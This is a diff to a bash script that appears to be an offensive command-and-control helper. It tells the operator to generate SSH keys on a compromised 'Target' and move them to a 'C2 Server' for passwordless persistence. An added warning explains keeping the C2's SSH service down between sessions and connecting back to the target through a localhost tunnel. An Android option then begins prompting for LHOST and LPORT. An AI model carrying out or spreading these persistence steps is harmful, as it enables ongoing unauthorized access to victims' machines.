@@ -763,7 +763,7 @@ do
 			echo -e "\e[1;34m**Step 6 - Generate SSH Authentication Certificate On Target & Move Public Key To C2 Server**\e[0m"
 			echo -e "\e[1;34mRun This Command On Your Target:\e[0m"
 			echo -e "\E[1;34m\e[97m \e[31mssh-keygen -t rsa\e[97m\E[1;34m"
-			echo -e "\e[1;34mHit Enter To Accept All Defaults \e[0m"
+			echo -e "\e[1;34mHit Enter To Accept All Defaults\e[0m"
 cat << "EOF"
 Your private key will be generated using the default filename (e.g., id_rsa) and stored on your Target in a .ssh directory off your home directory (e.g., ~/.ssh/id_rsa).
 
@@ -839,6 +839,18 @@ EOF
 			echo -e "\e[1;34m~/.ssh/.hosts\e[0m"
 			echo ""
 			read -p "Press Enter When Ready To Proceed"
+			echo ""
+cat << "EOF"
+***WARNING*** This setup requires cert only authentication both ways to maintain persistence. 
+The means the target machine will have the ability to SSH into your C2 WITHOUT A PASSWORD! However, this can be done safely.
+Once this is setup you need to run "service ssh stop" and make sure the SSH service does not start by default on boot.
+To check, after startup, run "service ssh status" to see if the service shows as inactive or active. If inactive/dead you are safe.
+When you need to interact with the target, simply run "service ssh start". Then wait 1 minute or less and run:
+ssh -l TARGET_USERNAME -p TARGET_PORT localhost   (as per the instructions above)
+Do your business and exit out of the session like normal. Then, run "service ssh stop" and leave the ssh service down until you 
+need to interact with the target again; at which time you will run "service ssh start" again and the cycle repeats.
+DO NOT FORGET THIS IMPORTANT USAGE STEP!!
+EOF
 			;; 
         "Android")
         read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport;
